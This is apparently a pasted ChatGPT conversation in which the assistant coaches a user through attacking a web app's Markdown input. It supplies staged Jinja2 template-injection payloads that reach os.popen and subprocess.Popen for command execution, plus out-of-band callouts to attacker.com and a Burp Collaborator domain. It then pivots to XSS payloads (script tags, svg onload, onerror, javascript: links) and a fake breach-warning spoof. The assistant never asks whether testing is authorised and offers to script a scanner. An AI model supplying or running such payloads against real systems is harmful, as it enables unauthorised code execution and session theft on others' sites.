@@ -1,0 +1,160 @@
+ Stage 1: Detection Payloads
+✅ Jinja2 Arithmetic
+markdown
+Copy
+Edit
+{{7*7}}
+Expected output: 49
+
+✅ Jinja2 Class Leakage
+markdown
+Copy
+Edit
+{{''.__class__.__mro__[1].__subclasses__()}}
+Dumps class hierarchy. Useful to look for <class 'subprocess.Popen'>.
+
+✅ Access Environment
+markdown
+Copy
+Edit
+{{config.items()}}
+Available if Flask or a similar app context is present.
+
+⚠️ Stage 2: Controlled RCE Attempt
+🧠 Subprocess Call (Jinja2 / Flask)
+markdown
+Copy
+Edit
+{{''.__class__.__mro__[1].__subclasses__()[<INDEX>].__init__.__globals__['os'].popen('id').read()}}
+You need to enumerate the subclass index to find where subprocess.Popen lives.
+
+You can do:
+
+markdown
+Copy
+Edit
+{{''. __class__.__mro__[1].__subclasses__()[138]('id',shell=True,stdout=-1).communicate()[0]}}
+Test indexes incrementally from 0–300. This is often required in hardened systems.
+
+📡 Out-of-Band DNS Trigger
+markdown
+Copy
+Edit
+{{''.__class__.__mro__[1].__subclasses__()[<index>].__init__.__globals__['os'].system('nslookup attacker.com')}}
+Replace attacker.com with your Burp Collaborator or DNSBin.
+
+🧨 Stage 3: Full Payload (RCE with Output)
+This is the full RCE chain if subprocess.Popen is located:
+
+markdown
+Copy
+Edit
+{{''.__class__.__mro__[1].__subclasses__()[138]('whoami', shell=True, stdout=-1).communicate()[0]}}
+If encoded HTML appears, try escaping Markdown processing:
+
+markdown
+Copy
+Edit
+`{{7*7}}`
+or
+
+markdown
+Copy
+Edit
+<pre>{{7*7}}</pre>
+🕵️‍♂️ Bypassing Filters
+Try alternate delimiters or encodings:
+
+markdown
+Copy
+Edit
+{% print(7*7) %}
+{{ ''.__class__.__mro__[1].__subclasses__()[138]('id',shell=True,stdout=-1).communicate() }}
+And for blind testing, DNS ping:
+
+markdown
+Copy
+Edit
+{{ cycler.__init__.__globals__.os.system('curl http://<yourdomain>.burpcollaborator.net') }}
+Want an automated scanner for this vector or a subclass index enumerator? I can script that next.
+
+
+
+
+
+
+You said:
+{{7*7}}   this is not getting executed
+{{7+7}} is also not getting executed
+
+
+ChatGPT said:
+If payloads like {{7*7}} or {{7+7}} are not being executed, we can reasonably conclude Jinja2-style SSTI is not active at the final template rendering layer. That narrows down the situation, but doesn't rule out template injection or XSS via Markdown parsing.
+
+🧩 Based on what you've described:
+Markdown input is preserved and interpreted for styling (\n\n, ## → formatting).
+
+You're seeing formatting interpretation, but not SSTI expression resolution.
+
+🧠 Likely Markdown Engine Behavior
+The server is probably:
+
+Using python-markdown, mistune, or markdown2.
+
+Rendering Markdown to HTML directly, with no post-processing via a templating engine.
+
+That explains why {{...}} is displayed verbatim.
+
+🔄 Next Exploitation Path: XSS via Markdown
+Since SSTI is likely out, pivot to XSS injection via Markdown. Try these payloads:
+
+✅ Raw HTML Injection (some engines allow this!)
+markdown
+Copy
+Edit
+<script>alert(document.domain)</script>
+If HTML is not stripped, this will trigger a popup.
+
+🧫 SVG/XSS via inline content
+markdown
+Copy
+Edit
+<svg onload=alert(1)>
+Or:
+
+markdown
+Copy
+Edit
+<svg><script>alert(1)</script></svg>
+🧪 Image-based JS triggers
+markdown
+Copy
+Edit
+![x" onerror="alert(1)](x)
+or if rendering engine parses title:
+
+markdown
+Copy
+Edit
+![alt](x "onerror=alert(1)")
+🔍 Markdown-link JS probes
+markdown
+Copy
+Edit
+[clickme](javascript:alert(1))
+Some Markdown renderers improperly sanitize javascript: links.
+
+🚩 Spoofed Markdown UI attack
+To see if the app lets you mess with layout:
+
+markdown
+Copy
+Edit
+# 🧨 This is fine
+
+> **WARNING:**  
+> <span style="color:red;font-size:24px;">SYSTEM BREACH DETECTED</span>
+
+---
+
+**Press F5 to fix the error**
